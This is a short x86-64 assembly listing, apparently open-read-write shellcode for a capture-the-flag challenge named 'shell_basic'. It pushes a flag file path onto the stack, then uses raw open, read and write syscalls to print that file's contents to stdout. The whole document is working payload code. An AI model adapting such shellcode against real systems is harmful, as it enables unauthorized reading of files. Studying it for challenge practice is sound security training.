section .data
  msg db "/tmp/shell_basic/flag_name_is_loooooong"

section .text
    global _start

_start:
    push 0x676e6f6f6f6f6f
    push 0x6f6c5f73695f656d
    push 0x616e5f67616c662f
    push 0x63697361625f6c6c
    mov rax, 0x6568732f706d742f
    push rax
    mov rdi, msg
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30
    mov rdx, 0x30
    mov rax, 0x0
    syscall
    mov rax, 1
    mov rdi, 0x1
    syscall
    mov rax, 60
    mov rdi, 0
    syscall
